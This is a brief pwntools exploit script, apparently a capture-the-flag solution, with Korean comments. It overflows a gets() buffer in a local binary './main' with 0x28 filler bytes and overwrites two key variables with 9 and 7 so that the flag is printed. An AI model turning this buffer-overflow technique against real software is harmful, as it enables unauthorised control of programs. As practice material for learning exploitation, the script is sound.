from pwn import *

p=process('./main')

# Vulnerability
# gets(buf)로 입력을 받기 때문에 버퍼 오버플로우가 발생하는 취약점이 잇다.

# check 함수에서 key1은 7 key2는 9 인 경우 flag를 출력시키기 때문에 
# 버퍼 오버플로우를 통해 key1 key2값을 해당 값으로 덮어 조건을 만족시키자는 시나리오를 씀


# Exploitation
payload=b'A'*0x28
payload+=p32(9) + p32(7)
pause()
p.sendline(payload)


p.interactive()
